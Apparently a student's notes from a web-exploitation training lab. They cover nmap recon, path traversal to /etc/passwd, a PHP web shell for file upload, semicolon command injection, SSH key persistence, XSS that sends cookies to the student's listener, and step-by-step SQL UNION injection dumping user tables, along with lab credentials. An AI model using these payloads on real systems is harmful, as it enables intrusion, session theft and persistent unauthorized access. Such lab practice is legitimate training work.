linux float : 10.50.24.121
win float : 10.50.27.70
Stack Number Username Password jump
1 NICH-012-M SHXACZ5bb3caaPn 10.50.28.6

recon
  nmap -Pn 10.50.28.71
    PORT     STATE  SERVICE
    22/tcp   open   ssh
    80/tcp   open   http
    3389/tcp closed ms-wbt-server
    8080/tcp closed http-proxy
    9999/tcp closed abyss
  nmap -Pn -p 80 --script http-enum.nse 10.50.28.71
      /robots.txt
      /java/
      /path/  
      /uploads/
  firefox 
    http://10.50.28.71/robots.text
        User-agent: *
        Allow: /uploads
        Allow: /chat
        Allow: /cmdinjection
        Allow: /java
        Allow: /path
        Allow: /webexample
        Disallow: /cross
        Disallow: /
        
        
        User-agent: Googlebot
        Disallow: /
        
        
        User-agent: Baiduspider
        Disallow: /

  10.50.28.71 webpages
    /robots.txt
    /java
      page about fruit
      selecting a fruit changes that option to melon
      java script found in header that created a function to do this
      
    /path
      page looks like it is inteded to read files
       forcing realtive path through the reader to find files for recon
        ../../../../../../../../etc/passwd ### useable as is for input field
         can be tacked on for get method / selector switch 


    /uploads
        malicious file upload
          need a file
          need to know where that file will be 
          need to be able to access that file
              <HTML><BODY>
              <FORM METHOD="GET" NAME="myform" ACTION="">
              <INPUT TYPE="text" NAME="cmd">
              <INPUT TYPE="submit" VALUE="Send">
              </FORM>
              <pre>
              <?php
              if($_GET['cmd']) {
                system($_GET['cmd']);
                }
              ?>
              </pre>
              </BODY></HTML>
    /chat
    /cmdinjection
      arbitrary command execution
        semicolon followed by a command
         ex.. ;whoami , ;uname -a, ;ip addr, ;cat /etc/passwd
    /webexample
      can see code with page source 
      or inspect (Q)
          use the network button to see http methods, cookies, etc
          
    /cross
        <script>alert('XSS');</script>
          alert worked field is vulernable to xss
        <img src="http://inavlid" onerror="window.open('http://10.50.28.71/java/fruit-7.jpg','xss','height=20,width=20');">
          as long as url is correct will pull img or whatever onto the site.
      cookie stealing 
        start webserver on linops
          python3 -m http.server
        <script>document.location="http://10.50.24.121:8000/"+document.cookie;</script> ##ip is linops station
    
to be used with command execution
  ssh-keygen -t rsa
  cat /home/student/.ssh/id_rsa.pub
    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD0aAF+kg4aGvAKsd7hOmTnZTnB0dHbYFe0JOlPQXxYmLiGLZ3wKFsHqcKkxYpJ2TK8IPI2ye5lRakE4H1fNmP7V2dRbD9L0SHL2G4XUKdqUVq0+YzsLlWB+lMlUiHCDVinPE+8uSPrxsi9PNr7pAnaCxFDQlo6To63oCEj1HxiX+U1G9enZyjoDQBD3yT9B01QdrVvKID5FEpqYZWPQO+xRe2Vzcoqo0MKYC6Sy7N315ih+1rIO4ra3YTTkzKMbnp0nuNoDRscFJg+isabZoElbMypYtUTnPnMFN4ehv8BnAwelbTR7vP8GFE7KZV/+U7kjK6lTQnhaZ5ibJ9FKHXl student@lin-ops
  from command injection 
  ;whoami
  ;cat /etc/passwd
    find home directory for user ##########will change based on output###########
      /var/www
  check for .ssh directory in home if none creat
  ;mkdir /var/www/.ssh 
  make an auth keys file and put your key in it
    echo Public Key >> /var/www/.ssh/authorized_keys  ### where 'Public Key' copy and paste ssh key created earlier



#######################SQL DEMO##################
[http://10.50.22.36/Union.html] 

Post method --> input field
1. Identify Vulnerable Field
    Audi' or 1='1 --> tried each variation ford, dodge etc..
2. Identify Number of Dispay Columns
    Audi' UNION SELECT 1,2,3,4 # --> error
    Audi' UNION SELECT 1,2,3,4,5 # -> returns audi with # of cloumns
3.Edit Golden Statement [statement has to match the # of columns] 
    Audi' union select table_schema,2,table_name,column_name,5 from information_schema.columns # -->dumps database 'content page'
4.Craft Query
    Audi' union select id,2,name,pass,5 from session.user # --> pulls user information from session database
    Audi' union select studentid,2,username,passwd,5 from session.userinfo # --> admin portion of actual class autmatically deleted
    Audi' union select session_id,2,user_id,remote_ip,5 from session.session_log # --> empty data
    Audi' union select cost,2,carid,color,5 from session.car# --> pulls information form cars table
    Audi' union select tireid,2,name,size,cost from session.Tires # --> 5 is a displayable cloumn and can be used to show different data

Get Method --> drop down menu --> manipulation happens in URL
1. Identify Vulnerable Field
    replace Selection=2&Submit=Submit
    with Selection=2 or 1=1 --> 2,3,4 all worked
2. Identify # of Display Colums
    Selection=4 union select 1,2,3 --> worked but the column order is 1,3,2
3. Edit Golden Statemnet 
    Selection=4 union select table_schema,column_name,table_name from information_schema.columns --> dumps database 'page of contents'
4. Craft Queries
    Selection=4 union select last_access,remote_ip,status from session.session_log  































  








